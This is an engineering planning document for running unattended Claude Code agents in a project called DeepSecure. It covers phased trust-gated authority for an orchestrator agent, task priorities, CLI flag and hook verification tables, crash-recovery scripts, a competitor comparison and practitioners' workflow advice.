**Recommended adoption path for DeepSecure (three-phase authority escalation):**

The critical distinction: Hermes should gain authority gradually, not all at once. Start as an observer, graduate to invoker, then to autonomous manager — each phase gated by earning trust.

| Phase | Hermes Role | Code Authority | What It Replaces |
|-------|------------|----------------|------------------|
| **1: Observer/Operator** | Schedule AFK jobs, send notifications, remember cross-session learnings, watch CI/logs, monitor repo state | **None** — Claude Code does all code writing via Ralph loop | `scripts/notify.sh`, `cron`, `.afk/learnings.md` |
| **2: Controlled Invoker** | Triggers Ralph loop runs, reviews output, decides whether to continue or escalate to human | **Indirect** — starts AFK runs and evaluates results, but doesn't write code itself | `scripts/ralph.sh` invocation, manual "check progress" |
| **3: Autonomous Manager** | Full AFK lifecycle: plan → decompose → spawn parallel agents → review → merge → deploy | **Full** — but scoped via DeepSecure delegation_tokens with TTL, audit trail, and revocation | `parallel-build.sh`, manual merge review, human orchestration |

**Phase 1 is safe to start now** (after Ralph loop is stable). Hermes scheduling + notifications are strictly superior to bash scripts. It observes and reports but changes nothing.

**Phase 2 requires trust earned in Phase 1.** Hermes invokes Claude Code but doesn't bypass the verification gates (tests, lint, review).

**Phase 3 requires DeepSecure identity controls.** This is where the dog-fooding story becomes critical — Hermes should not get autonomous merge authority without scoped delegation_tokens, audit trails, and bounded blast radius. See [DeepSecure as AFK Security Infrastructure](#deepsecure-as-afk-security-infrastructure-dog-fooding) for the identity pattern that gates this phase.

**Effort:** 10 hours | **Impact:** Very High -- enables multi-service parallel AFK development with observability, recovery, and keepalive

---

## Priority Ranking (Revised June 2026)

| Priority | Action | Effort | Impact | What It Enables |
|----------|--------|--------|--------|-----------------|
| **P0** | Verify Claude Code API surface | 2 hr | BLOCKER | Everything depends on this — test every assumed flag, hook, env var |
| **P0** | Permission allowlisting (1a) | 30 min | High | Unblocks all AFK work |
| **P0** | Stop hook enhancement (1b) | 30 min | High | Prevents premature agent stopping |
| **P0** | Notification hook (1f) | 15 min | High | Know when agent is blocked on permission |
| **P0** | Configure Agent SDK billing overflow | 15 min | BLOCKER | Prevents silent credit exhaustion during AFK (Principle 15) |
| **P1** | `afk-once.sh` with dirty-tree guard (2a) | 2 hr | High | Learn failure domains before automating |
| **P1** | `ralph.sh` with JSON progress + sentinel + caffeinate (2b) | 3 hr | Very High | Core AFK execution engine |
| **P1** | JSON progress template (2d) | 30 min | High | Reliable state tracking (Principle 12) |
| **P1** | SessionStart hook — compact matcher (1d) | 1 hr | High | Prevents context loss in long sessions |
| **P1** | SessionStart hook — startup matcher (1e) | 30 min | Medium | Agents start with situational awareness |
| **P1** | PostToolUse auto-format (1c) | 1 hr | Medium | Eliminates CI format failures |
| **P1** | Notification system (Phase 3) | 2 hr | High | Know when to come back |
| **P1** | `.afk/learnings.md` (2c) | 30 min | Medium | Systematic failure capture |
| **P1** | Evaluate `/goal` for single-task AFK | 1 hr | High | Built-in autonomous completion with evaluator |
| **P1** | Evaluate Agent View for AFK monitoring | 1 hr | High | May replace custom monitoring scripts |
| **P2** | AFK security profile + Docker sandbox (3.5) | 3 hr | High | Safe unsupervised execution (OWASP ASI05) |
| **P2** | `/afk` toggle command | 2 hr | High | One-command AFK mode switching |
| **P2** | `/babysit-pr` skill | 4 hr | High | Autonomous PR lifecycle |
| **P2** | `/autofix-pr` skill | 4 hr | High | Autonomous CI fixing |
| **P2** | `/security-scan` skill | 3 hr | High | Prevent vulnerable code in AFK commits |
| **P2** | Agent frontmatter upgrade (1.5) | 2 hr | Medium | Correct tool access and model selection |
| **P2** | Evaluate Dynamic Workflows for Phase 6 | 4 hr | High | May eliminate custom parallel scripts |
| **P2** | Set up Routines for recurring tasks | 2 hr | High | Cloud-based AFK — no laptop needed |
| **P2** | AFK cost monitoring + alerting | 2 hr | High | Prevent billing surprises (Agent SDK credits) |
| **P3** | CLAUDE.md refactoring (Phase 5) — **AFTER** 1d hook verified | 4 hr | Medium | Token savings, progressive disclosure |
| **P3** | `/grill-me` skill | 2 hr | Medium | Better specs before implementation |
| **P3** | `/verify-app` skill | 4 hr | Medium | End-to-end feature verification |
| **P3** | `doc-gardener` agent | 4 hr | Medium | Skills staleness audit |
| **P3** | `/context-engineering` skill | 2 hr | Medium | Context management guidance |
| **P3** | Parallel orchestration scripts (Phase 6) — only if Dynamic Workflows insufficient | 10 hr | Very High | Multi-service parallel AFK |
| **P3** | `/identity-management` skill | 4 hr | Medium | Zero-trust AFK agent identity |
| **P3** | Skill `gotchas.md` files | 3 hr | Medium | Domain-specific pitfall prevention |
| **P3** | AFK quality monitoring (Principle 14) | 3 hr | Medium | Detect silent degradation, model fallbacks |
| **P4** | Zero-trust AFK identity integration | 8 hr | High | Dog-food DeepSecure for AFK security |
| **P4** | Fast-merge policy + automated rollback | 6 hr | Medium | Remove human bottleneck at scale |
| **P4** | Hermes Agent v0.14.0 evaluation | 6 hr | Medium | Evaluate `/handoff`, cross-session caching, proxy |
| **P4** | One-minute build rule enforcement | 3 hr | Medium | Force smaller, faster feedback loops |

**Total estimated effort:** ~99 hours across all phases (revised up from 86 — new items: Agent SDK billing, /goal eval, Agent View eval, Routines, cost monitoring, quality monitoring, Hermes v0.14.0)

**Recommended order:**
1. **P0 items first** (3.5 hours) — verify API surface (BLOCKER), configure billing overflow, then unblock AFK
2. **P1 items next** (13.5 hours) — gives you a working AFK loop with JSON progress, dirty-tree guard, sentinel detection, cost ceiling, sleep prevention, notifications, context recovery, plus evaluation of `/goal` and Agent View as potential simplifications
3. **P2 items** (26 hours) — completes autonomous PR lifecycle with Docker sandbox (OWASP ASI05), Dynamic Workflows eval, Routines for cloud-based AFK, cost monitoring, AFK toggle, vulnerability scanning
4. **P3 items** (32 hours) — optimization, scaling, identity management, quality monitoring, and maintenance automation
5. **P4 items** (23 hours) — zero-trust dog-fooding, fast-merge policy, Hermes Agent v0.14.0 evaluation, build speed enforcement

**Game-changers to evaluate early:**
- **Routines** may eliminate the need for local AFK infrastructure entirely (no laptop, no caffeinate, no crash recovery) — but limited to 5-25 runs/day and restricted branch access
- **`/goal`** may replace the Ralph loop for single-task AFK — built-in evaluator, no custom scripts
- **Agent View supervisor** may replace `nohup` + `caffeinate` + PID tracking — but doesn't survive shutdown

---

## Architectural Decision: Ralph Loop vs /run-batch

**This is the single most important decision before implementation.** The current document describes two execution paths that overlap and will drift:

### The Conflict

| Execution Path | How It Works | What It Provides |
|----------------|-------------|------------------|
| **Ralph loop** (`ralph.sh`) | Fresh `claude --print` per task, reads JSON progress, implements one task, commits | Fresh context, dirty-tree recovery, sentinel detection, cost ceiling |
| **`/run-batch --continue --auto-heal`** | Single conversation session chains batches, follows skill spec procedurally | Spec-implementation audit, merge point verification, container testing, cross-service integration |

The Ralph loop bypasses `/run-batch` entirely — it runs tasks via `--append-system-prompt` instead of through the `/run-batch` pipeline. This means:
- No spec-implementation audit (Step 6 of `/run-batch`)
- No cross-service integration verification (Step 7.5)
- No merge point execution via `execute_merge_point.sh` (Step 7e)
- No container rebuild and test (Step 7h)

### Three Options

**Option A: Ralph wraps /run-batch (RECOMMENDED)**

Each Ralph iteration invokes `/run-batch` for one batch. Gets all verification infrastructure. Heavier per iteration but maintains rigor.

```bash
# In ralph.sh, replace direct claude invocation with:
claude --print \
  --prompt-file "$PROMPT_FILE" \
  --append-system-prompt "Run /run-batch $BATCH_ID $WORKSTREAM. Execute only this one batch. When done, exit." \
  < /dev/null
```

**Pros:** Full verification pipeline, merge point handling, spec auditing
**Cons:** Heavier per iteration (~15-20 min vs ~5-10 min), single-batch granularity

**Option B: Ralph replaces /run-batch**

Lightweight, fast, but loses merge point verification, spec auditing, container testing. Use only if `/run-batch` infrastructure proves too heavy for AFK iteration speed.

**Pros:** Fast iterations, simple
**Cons:** No verification beyond tests, status files may drift

**Option C: /run-batch --continue --auto-heal IS the AFK engine (no Ralph)**

Single session, chains batches. No Ralph needed. But context sediment accumulates, and machine sleep/crash loses all state.

**Pros:** Existing infrastructure, no new scripts
**Cons:** Sediment problem (Principle 3), no crash recovery, no cost ceiling per task

### Recommendation

**Start with Option B** (Ralph replaces /run-batch) for the first 5-10 `afk-once.sh` manual iterations. This lets you learn failure domains fast without the overhead of the full pipeline.

**Graduate to Option A** (Ralph wraps /run-batch) once you've validated that:
1. The Ralph loop is stable (3+ successful unattended runs)
2. The JSON progress file is reliable
3. Notification system catches failures promptly

The key insight: **Option C is the wrong architecture for AFK.** A single long session violates Principle 3 (Ralph is Monolithic — fresh context per iteration) and Principle 11 (compounding error math — more steps = lower reliability). The industry consensus is overwhelmingly in favor of fresh context per iteration.

---

## Verified Claude Code API Surface (June 2026)

**CRITICAL (P0 BLOCKER):** Before implementing any phase, verify every assumed Claude Code feature against the actual binary. This section documents what was verified vs. what needs testing.

### CLI Flags

| Flag | Status | Notes |
|------|--------|-------|
| `--print` / `-p` | **Verified** | Non-interactive headless mode (draws from Agent SDK credits after June 15) |
| `--output-format json` | **Verified** | JSON output (includes metadata, cost, model identity) |
| `--prompt-file <path>` | **Verified** | Load prompt from file |
| `--allowedTools <list>` | **Verified** | Restrict available tools |
| `--max-turns N` | **Verified** | Cap reasoning iterations |
| `--max-budget-usd N` | **Verified** | Per-session cost ceiling |
| `--append-system-prompt <text>` | **Verified** | Append to system prompt |
| `--dangerously-skip-permissions` | **Verified** | Full autonomy bypass (not recommended) |
| `--permission-mode auto` | **Needs testing** | Classifier-gated auto-approve |
| `--system-prompt-file <path>` | **Needs testing** | Override default system prompt (print mode only) |
| `--bare` | **Needs testing** | Skip hooks/CLAUDE.md for faster CI startup |
| `--teleport` | **Needs testing** | Hand work between local and web sessions |
| `--worktree` | **Needs testing** | Auto-create git worktree for isolation |
| `--tmux` | **Needs testing** | Run in tmux session |
| `--bg "prompt"` | **Documented** | Launch session to background (v2.1.139+) |
| `--bg --name "name"` | **Documented** | Background with display name |
| `--bg --exec 'cmd'` | **Documented** | Run shell command as background job (no model) |
| `--bg --agent <name>` | **Documented** | Run specific subagent as background (v2.1.157+) |
| `--resume <id>` | **Documented** | Resume a previous session |
| `--resume <id> --fork-session` | **Documented** | Fork session (copy context, new ID) |
| `--add-dir <path>` | **Documented** | Grant file access to additional directories |
| `--fallback-model <model>` | **Documented** | Retry turn on fallback model for non-retryable errors |
| `--name "name"` | **Documented** | Set session display name |
| `--effort <level>` | **Documented** | low/medium/high/xhigh/max reasoning (v2.1.142+) |
| `--model <alias>` | **Documented** | Model selection (default/best/sonnet/opus/haiku/opus[1m]/sonnet[1m]) |

### Commands (In-Session)

| Command | Status | Notes |
|---------|--------|-------|
| `/goal <condition>` | **Documented** (v2.1.139+) | Evaluator-based autonomous completion; Haiku-class checker |
| `/goal clear` | **Documented** | Stop/cancel active goal (aliases: stop, off, reset, none, cancel) |
| `/schedule` | **Documented** | Create/manage cloud-based Routines |
| `/bg` or `/background` | **Documented** | Move current session to background |
| `/branch` | **Documented** | Fork session (same as `--fork-session`) |
| `/fast` | **Documented** | Toggle 2.5x faster Opus responses (higher cost) |
| `/effort ultracode` | **Documented** | xhigh reasoning + automatic workflow orchestration |
| `/deep-research` | **Documented** | Built-in fan-out research workflow |
| `/memory` | **Documented** | Configure auto-memory and auto-dream |
| `/compact <hint>` | **Documented** | Manual compaction with steering focus |
| `/context` | **Documented** | Show what's using context space |
| `/add-dir <path>` | **Documented** | Add directory access during session |
| `/rewind` | **Documented** | Jump to prior message (Esc Esc) |

### Agent Management Commands

| Command | Status | Notes |
|---------|--------|-------|
| `claude agents` | **Documented** (v2.1.139+) | Open agent dashboard |
| `claude agents --json` | **Documented** | JSON output for scripting |
| `claude agents --cwd <path>` | **Documented** | Filter to one project |
| `claude attach <id>` | **Documented** | Attach to session |
| `claude logs <id>` | **Documented** | View recent output |
| `claude stop <id>` | **Documented** | Stop session |
| `claude kill <id>` | **Documented** | Force-stop session |
| `claude respawn <id>` | **Documented** | Restart with conversation intact |
| `claude respawn --all` | **Documented** | Restart all sessions (post-update recovery) |
| `claude rm <id>` | **Documented** | Remove session |
| `claude daemon status` | **Documented** | Supervisor process state |
| `claude daemon stop --any` | **Documented** | Stop supervisor (--keep-workers optional) |

### Hook Events

| Event | Status | Matchers | Notes |
|-------|--------|----------|-------|
| `Notification` | **Verified** | `permission_prompt`, `idle_prompt`, `auth_success` | Replaces old "PermissionRequest" |
| `PostToolUse` | **Verified** | Tool name pattern (e.g., `Edit\|Write`) | Auto-format hook |
| `PreToolUse` | **Verified** | Tool name + command pattern | Blocking/validation |
| `SessionStart` | **Verified** | `startup`, `resume`, `clear`, `compact` | Replaces old "PostCompact"/"PreCompact" |
| `Stop` | **Verified** | *(none)* | Fires when agent prepares to halt |
| ~~`PostCompact`~~ | **DOES NOT EXIST** | — | Use `SessionStart` with `compact` matcher |
| ~~`PreCompact`~~ | **DOES NOT EXIST** | — | No pre-compaction hook |
| ~~`PermissionRequest`~~ | **DOES NOT EXIST** | — | Use `Notification` with `permission_prompt` |
| ~~`SessionEnd`~~ | **DOES NOT EXIST** | — | Use `Stop` hook |
| ~~`SubagentStop`~~ | **DOES NOT EXIST** | — | Handled internally by harness |

### Hook Environment Variables

| Variable | Status | Notes |
|----------|--------|-------|
| `$TOOL_INPUT` | **Needs testing** | Tool input as JSON — used in PostToolUse |
| `$TOOL_NAME` | **Needs testing** | Name of the tool being called |
| `$DESCRIPTION` | **Needs testing** | Description of the action |
| `$SUBAGENT_NAME` | **DOES NOT EXIST** | — |

### Agent Frontmatter Fields

| Field | Status | Notes |
|-------|--------|-------|
| `name:` | **Needs testing** | Agent identifier |
| `description:` | **Needs testing** | Agent purpose |
| `model:` | **Needs testing** | Model override (opus/sonnet/haiku) |
| `tools:` | **Needs testing** | Tool allowlist |
| `isolation:` | **Needs testing** | Worktree isolation mode |

### Verification Script

Run this before implementing any phase:

```bash
#!/bin/bash
# scripts/verify-claude-api.sh - Test assumed Claude Code features

echo "=== Claude Code API Surface Verification ==="

# Test basic flags
echo "--- Testing CLI flags ---"
echo "test" | claude --print --max-turns 1 --max-budget-usd 0.10 < /dev/null 2>/dev/null && echo "✅ --print + --max-turns + --max-budget-usd" || echo "❌ Basic flags failed"

# Test hooks format
echo "--- Testing hook configuration ---"
python3 -c "
import json
hooks = json.load(open('.claude/hooks.json'))
for event in ['Notification', 'PostToolUse', 'PreToolUse', 'SessionStart', 'Stop']:
    print(f'  Hook event: {event} -> {\"configured\" if event in hooks.get(\"hooks\", {}) else \"not configured\"}')"

# Test --permission-mode
echo "--- Testing --permission-mode ---"
echo "say hi" | claude --print --permission-mode auto --max-turns 1 < /dev/null 2>/dev/null && echo "✅ --permission-mode auto" || echo "❌ --permission-mode auto not supported"

echo ""
echo "=== Run this BEFORE implementing any AFK phase ==="
```

---

## Machine Sleep and Recovery Protocol

**CRITICAL (May 2026 review finding):** No recovery protocol existed for laptop sleep, hibernate, or reboot during AFK runs. This section addresses GAP #42.

### Prevention

| Mechanism | Platform | How | Limitation |
|-----------|----------|-----|-----------|
| `caffeinate -i -w $$` | macOS | Prevents idle sleep for duration of script | Does not prevent lid-close sleep |
| `caffeinate -s -w $$` | macOS | Prevents sleep entirely (including lid close) | Drains battery if not plugged in |
| `systemd-inhibit --what=sleep` | Linux | Prevents system sleep | Requires systemd |
| Cloud VM | Any | Machine never sleeps | Requires cloud account, costs money |

**Recommended for overnight AFK:**
```bash
# Add to ralph.sh (already included in Phase 2b update):
if command -v caffeinate &>/dev/null; then
  caffeinate -i -w $$ &
  CAFFEINATE_PID=$!
fi

# For guaranteed overnight operation:
# Option 1: Keep lid open + caffeinate
# Option 2: Use a cloud VM (Modal, Daytona, etc.)
# Option 3: Use a dedicated always-on machine (Ramp's approach)
```

### Recovery After Crash/Sleep

When a machine sleeps or reboots during an AFK run, the following states are possible:

| State | How to Detect | How to Recover |
|-------|---------------|----------------|
| Clean (task committed) | `git log -1` shows last completed task | Just restart `ralph.sh` — JSON progress is updated |
| Dirty tree (files modified, not committed) | `git status --short` shows changes | Review changes → commit or stash → restart |
| Partial JSON update | `python3 -c "import json; json.load(open('ralph_progress.json'))"` fails | Restore from git: `git checkout ralph_progress.json` |
| Docker containers stopped | `docker compose ps` shows exited containers | `docker compose up -d` → restart `ralph.sh` |

**Recovery script:**
```bash
#!/bin/bash
# scripts/afk-recover.sh - Recover from crashed AFK session
WORKSTREAM=${1:?"Usage: afk-recover.sh <workstream-name>"}
PROGRESS_FILE="docs/workstreams/$WORKSTREAM/ralph_progress.json"

echo "=== AFK Recovery ==="

# Check git state
DIRTY=$(git status --short | head -10)
if [ -n "$DIRTY" ]; then
  echo "DIRTY TREE detected:"
  echo "$DIRTY"
  echo ""
  echo "Stashing changes..."
  git stash push -m "afk-recover: $(date +%Y%m%d_%H%M%S)"
fi

# Validate JSON progress
if ! python3 -c "import json; json.load(open('$PROGRESS_FILE'))" 2>/dev/null; then
  echo "CORRUPT JSON detected. Restoring from last commit..."
  git checkout "$PROGRESS_FILE"
fi

# Check Docker
if command -v docker &>/dev/null; then
  STOPPED=$(docker compose ps --status exited 2>/dev/null | tail -n +2 | wc -l | tr -d ' ')
  if [ "$STOPPED" -gt 0 ]; then
    echo "Restarting $STOPPED stopped Docker containers..."
    docker compose up -d
    sleep 5
  fi
fi

# Report status
echo ""
echo "=== Recovery Complete ==="
REMAINING=$(python3 -c "import json; d=json.load(open('$PROGRESS_FILE')); print(sum(1 for t in d['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null)
echo "Tasks remaining: $REMAINING"
echo "Ready to restart: ./scripts/ralph.sh $WORKSTREAM"
```

### Eva Khmelinskaya's Phased Session Architecture

Instead of one long overnight session, break work into **30-60 minute phases**, each as an independent `claude --print` invocation:

```
Phase 1 (30 min): Read STATUS.md → Implement tasks A1-A3 → Commit → Update STATUS.md → Exit
Phase 2 (30 min): Read STATUS.md → Implement tasks B1-B2 → Commit → Update STATUS.md → Exit
Phase 3 (30 min): Read STATUS.md → Run integration tests → Fix failures → Commit → Exit
```

Each phase reads artifacts from disk (not conversation context), does work, commits, and exits. The next phase picks up from artifacts. This is structurally identical to the Ralph loop but with explicit time-boxing.

**Why time-boxing matters:** Even within a single Ralph iteration, a complex task can consume the full context window. Time-boxing (via `--max-budget-usd` as a proxy) prevents any single iteration from running long enough to hit the sediment problem.

### Agent View Supervisor as Recovery Infrastructure (June 2026)

The Agent View supervisor process (v2.1.139+) changes the recovery picture significantly:

| Old Recovery (ralph.sh) | New Recovery (Agent View) |
|-------------------------|--------------------------|
| `caffeinate -s -w $$` to prevent sleep | Supervisor preserves sessions across sleep (not shutdown) |
| `afk-recover.sh` for crash detection | `claude respawn <id>` restarts with conversation intact |
| Manual PID tracking | `claude agents --json` shows all session states |
| `nohup ralph.sh &` + `< /dev/null` | `claude --bg "prompt"` — supervisor manages lifecycle |
| No update resilience | Auto-detects binary updates, restarts sessions on new version |

**Recovery commands:**
```bash
# Check all session states after wakeup
claude agents --json | jq '.[] | {id, state, name}'

# Restart a failed session
claude respawn <session-id>

# Restart all sessions (e.g., after update)
claude respawn --all

# View what happened during sleep
claude logs <session-id>
```

**Limitation:** Supervisor does not survive machine shutdown (only sleep). For overnight runs that span a potential shutdown, use Routines (cloud-based) instead of local background sessions.

---

## Competitive Landscape (June 2026)

The AFK coding space has converged rapidly. All major tools now offer background agents, subagent orchestration, and parallel execution.

| Tool | Background Agents | Subagent Orchestration | Max Parallelism | Pricing |
|------|-------------------|----------------------|-----------------|---------|
| **Claude Code** | Agent View supervisor + Routines | Dynamic Workflows (JS) | 16 concurrent, 1,000 total | $20/mo Pro + Agent SDK credits |
| **Cursor** | Cloud agents (v2.5) | Nested subagents, async tree | Build in Parallel | $20/mo Pro, $200/mo Ultra |
| **Devin Desktop** (formerly Windsurf) | Cloud-native | Subagent support | — | $20/mo Core + $2.25/ACU |
| **GitHub Copilot** | Agent mode | Multi-model (Claude/Codex/Copilot) | Same issue → all 3 models | Credit-based ($0.01/credit) |
| **Antigravity 2.0** (Google) | Scheduled background tasks | Dynamic subagents | — | Free to $200/mo |
| **Kiro** (AWS) | — | Parallel spec tasks (4x faster) | — | — |
| **Ramp Inspect** | Cloud sandboxes (Modal) | Child sessions | Unlimited concurrent | Internal |

**Notable shifts:**
- **Devin price collapse:** $500/mo → $20/mo Core — removes price barrier for background agents
- **Copilot multi-model:** Can assign same issue to Claude, Codex, and Copilot simultaneously — tournament pattern built-in
- **Convergence on JS/TS orchestration:** Claude (Dynamic Workflows), Cursor (skills), Antigravity (Go SDK) — all moving toward programmable agent composition

**DeepSecure positioning:** Claude Code's Dynamic Workflows (1,000 subagent cap) represent the most scalable orchestration, and Routines provide true cloud-based AFK (no laptop required). The main risk is Agent SDK billing limiting headless usage to $20-200/mo.

---

## The Contrarian Views

### Dax Raad (OpenCode Creator, 165k+ GitHub Stars)

Argues that multi-agent parallelism feels productive but often isn't:

> "Opening eight agents and watching them all run at once feels incredible. But it's what I call the sinister thing about multitasking. The productivity feeling is real but the productivity is not."

> "You'd probably ship more doing things one at a time with a faster model."

**His advice:**
1. Define interfaces and architecture manually first ("agent comes later")
2. Bring in agents for well-scoped implementation work, not design
3. Use one agent at a time with a fast model rather than many in parallel
4. Be honest about whether parallelism is actually productive or just feels good

**Additional from Dax:**
- Client-server architecture for remote driving -- run on your computer, drive from mobile app
- Provider-agnostic design (75+ models) -- don't lock into one provider
- 80% of OpenCode effort goes to UX, 20% to harness -- "most users cannot notice harness quality differences beyond a minimum threshold, but UX determines adoption"

### Geoffrey Huntley (Ralph Loop Creator)

Explicitly argues against multi-agent coordination:

> "Consider what microservices would look like if the microservices (agents) themselves are non-deterministic -- a red hot mess."

Advocates single-process, single-task execution. The deliberate simplicity is the feature. Complexity in orchestration adds non-determinism on top of non-determinism.

### Peter Steinberger (steipete — Anti-Infrastructure)

The most radical contrarian in the AFK space. Former PSPDFKit founder, now builds with AI agents daily. His positions challenge nearly every pillar:

> "No git worktree from CLI sessions unless user asks." — steipete's AGENTS.MD

**What he rejects:**

| Convention | steipete's Take | Reasoning |
|-----------|-----------------|-----------|
| Git worktrees | No — runs 3-8 agents in single folder | "Worktrees slow me down" |
| MCP servers | No — removed his last one | "Context poison" — wastes tokens with tool schemas |
| Subagents | No — separate terminal windows | Complete visibility, no orchestration abstraction |
| Claude Code plugins | No | "A big pile of bs" |
| Elaborate CLAUDE.md | No — started with one line | Rules built iteratively by the agent, not authored upfront |

**What he does instead:**
- **Pointer-style AGENTS.MD:** One shared rules file at `~/Projects/agent-scripts/AGENTS.MD` symlinked from all repos — eliminates per-project CLAUDE.md maintenance
- **Iterative rules:** His actual AGENTS.MD grew to ~800 lines, but was built by the agent itself ("elaborate rules files are organizational scar tissue" — let them grow organically)
- **Screenshots as prompts:** ~50% of his prompts contain screenshots. Prompts are 1-2 sentences.
- **Tool switching:** Uses both Claude Code and OpenAI Codex CLI. Finds Codex "far more careful and reads much more files" before acting, while Claude is "much more eager."
- **"Agentic Engineering":** Treats AI coding as a craft requiring senior-engineer intuition. "AI handles code implementation, not strategic thinking."

**The lightweight alternative pattern:**

| Heavy AFK (this doc) | steipete's Lightweight |
|---------------------|----------------------|
| Per-project CLAUDE.md (500+ lines) | Shared AGENTS.MD (symlinked) |
| Worktree isolation per agent | Single folder, multiple terminals |
| MCP servers for integrations | CLIs called directly via Bash |
| Subagent orchestration | Manual window management |
| Dynamic Workflows | One agent at a time, well-prompted |

**When to consider the lightweight approach:** Solo practitioners on single-service projects where the orchestration overhead exceeds the task complexity. steipete's workflow optimizes for visibility and control at the cost of parallelism.

### How to Reconcile

- The existing DeepSecure pipeline's emphasis on planning (`/run-plan`, `/breakdown-design`, `/explore-codebase`) aligns with Dax's "interfaces first" philosophy
- Don't skip planning in favor of throwing more agents at the problem
- **Default to the Ralph loop (sequential, one-at-a-time)**; parallel orchestration only when work is genuinely independent
- Reserve multi-agent parallelism for truly independent workstreams (e.g., control plane + gateway when they don't share schemas)
- Measure actual output (merged PRs, passing tests) not activity (number of agents running)
- Start manual (`afk-once.sh`), graduate to supervised AFK, then full AFK -- per Huntley's methodology
- **steipete's test:** If your CLAUDE.md is growing faster than your codebase, you're over-engineering the harness. Let rules accumulate from failures, not from anticipation.

---

## Key Takeaways by Practitioner

### Boris Cherny (Claude Code Creator)
- **Plan mode:** Shift+Tab x2, iterate on the plan, one-shot implementation
- **Worktrees:** 5 parallel Claudes in iTerm2 tabs (numbered 1-5), plus 5-10 browser sessions on claude.ai, plus mobile sessions
- **Shell aliases:** `za`, `zb`, `zc` for one-keystroke worktree hopping
- **Scale:** 20-30 PRs/day normal, 150 PRs/day peak, "hundreds of agents at any given moment, thousands more doing overnight work"
- **Model choice:** "Surprisingly vanilla" -- Opus 4.5 with thinking enabled, sticks with one model for a week to measure actual re-prompting costs
- **CLAUDE.md:** Compounding engineering -- "end corrections with 'Update your CLAUDE.md so you don't make that mistake again'"
- **Verification:** "If Claude has a feedback loop to verify its own work, it 2-3x the quality"
- **Permissions:** `/permissions` allowlist, never `--dangerously-skip-permissions`
- **Top hooks:** PostToolUse (auto-format), SessionStart with compact matcher (context recovery), Notification with permission_prompt matcher (Slack), Stop (keep going)
- **Subagents:** `code-simplifier`, `verify-app` -- 5 subagents to explore codebase in parallel
- **Key commands:** `/loop` (cron-style), `/batch` (parallel migrations), `/quality` (PR health)
- **Teleport:** Hand work between local and web/mobile with `&` command or `--teleport` flag
- **Context switching:** "It's not about deep work, it's about how good I am at context switching and jumping across multiple different contexts very quickly"
- **NEW — Dynamic Workflows (98 tips):**
  - **`/go`:** Composite custom skill: verify end-to-end → `/simplify` → create PR. "Many prompts look like 'Claude do blah /go'"
  - **`/simplify`:** Parallel agents for code quality improvement
  - **`/btw`:** Side-chain single-turn conversation with full context
  - **`/focus`:** Hide intermediate work, show final result
  - **`/rewind` (Esc Esc):** Jump to prior message. "Correcting: reads + failed attempt + correction + fix. Rewinding: reads + one informed prompt + fix."
  - **`CLAUDE_CODE_AUTO_COMPACT_WINDOW=400000`:** Boris's recommended compaction threshold for 1M context models — context rot kicks in around 300k-400k tokens
  - **Auto-dream:** Subagent that periodically reviews accumulated auto-memory, keeps signal, removes outdated assumptions, merges insights. Named after REM sleep consolidation. Access via `/memory`.
  - **Delegation model (Opus 4.7+):** Treat Opus like engineer you hand off to, not pair programmer. Requires: Goal (what success looks like), Constraints (non-goals), Acceptance criteria (verification method).

### Thariq (Anthropic -- Skills Framework)
- **9 skill categories:** Library/API Reference, Product Verification, Data/Monitoring, Workflow Automation, Code Quality, Deployment, Scaffolding, Runbooks, Infrastructure Operations
- **Skills are folders, not files:** Include scripts, assets, gotchas, reference code
- **Top skills for AFK:** `/babysit-pr` (monitors PR through lifecycle), `/deploy-<service>` (build, smoke test, gradual rollout, auto-rollback)
- **Measurement:** PreToolUse hook to track skill usage and find under-triggering skills
- **Anthropic runs hundreds of skills internally**

### Noah Zweben (Anthropic PM)
- **`/autofix-pr`:** Ships conversation + edits to cloud, agent autonomously fixes CI + review comments
- **`claude --worktree --tmux`:** Fire and forget -- spin up autonomous Claude on its own worktree in its own terminal
- **`/schedule`:** Cloud-based recurring tasks (sweeping open PRs, building features from approved issues, analyzing CI failures overnight, syncing docs, auto-maintaining a twin Go library for a Python library)
- **Monitor tool:** Event-driven (not polling) background watcher -- every stdout line is a real-time event
- **Remote Control:** Start local, continue from phone via Claude iOS app
- **NEW — Routines (April 2026):**
  - Three trigger types: scheduled (cron), API (HTTP POST), GitHub (PR/release events with filters)
  - Daily caps: Pro 5/day, Max 15/day, Team/Enterprise 25/day (one-off exempt)
  - Runs on Anthropic cloud — works when laptop is closed
  - Default push only to `claude/`-prefixed branches
  - All MCP connectors included by default
  - `/schedule in 2 weeks, open a cleanup PR` — one-off future tasks

### Matt Pocock
- **Ralph Wiggum:** `while true` loop with fresh context each iteration -- the core AFK engine
- **Sandcastle:** Framework for spawning N parallel agents in worktrees + Docker (Planner -> Implementer -> Reviewer -> Merger)
- **Grill, Spec, Slice, Ship:** 5-stage workflow: interview (40-80 questions) then PRD then vertical tracer bullets then AFK ship
- **CODE_STANDARDS.md:** Move standards out of CLAUDE.md, enforce them via reviewer agent on PRs
- **Cap iterations:** 5-10 for small AFK tasks, 30-50 for larger ones
- **Vertical tracer bullets:** Build end-to-end (schema through UI), not layer by layer
- **Context limit:** "Keep LLM context under ~100k tokens; clear and restart rather than compact to avoid sediment degrading quality"
- **Result:** "889 commits, none of them hand-coded"

### Geoffrey Huntley (Ralph Loop Creator)
- **Monolithic Ralph:** Single process, single task, no multi-agent coordination
- **Manual first:** Do the loop manually with Ctrl+C pauses before automating
- **Watch the loop:** Learning comes from observing failures and fixing failure domains
- **Evolutionary software (Loom):** Long-term aspiration -- auto-identify, fix, deploy, verify
- **Simplicity is the feature:** The loop is deliberately simple because agents are non-deterministic

### Ryan Carson (One-Person Code Factory)
- **`prd.json` with `passes: true/false`:** Machine-parseable completion tracking
- **Skills decay:** "A Next.js skill from six months ago may conflict with your current component library." Need staleness audit.
- **15 simultaneous agents, $2-3k/month token burn** -- the economics of AFK
- **"AI Chief of Staff":** Cron job triaging inbox/Slack through a priority map
- **Code factory = automations + skills for daily repeatable jobs**

### Andrej Karpathy (Software 3.0)
- **"Automate what you can verify":** Tasks with tests = full AFK. Tasks needing judgment = human gates.
- **"Jagged intelligence":** Models spike where tasks are verifiable AND received training attention. Crypto/auth is in a valley.
- **"Outsource thinking, never understanding":** AFK for implementation, not architecture.
- **Agent-native docs:** "Context window is the new program." Optimize documentation for agents.

### Mike Piccolo (Agent AFK)
- **Full pipeline:** spec, research, plan, parallelize, build, verify, heal, ship
- **Permission bubbling:** Nested subagents forward permission requests up to parent/user
- **Transitive abort:** Cancel parent = cancel all children
- **Self-healing:** If verification fails, automatically diagnose and fix before shipping
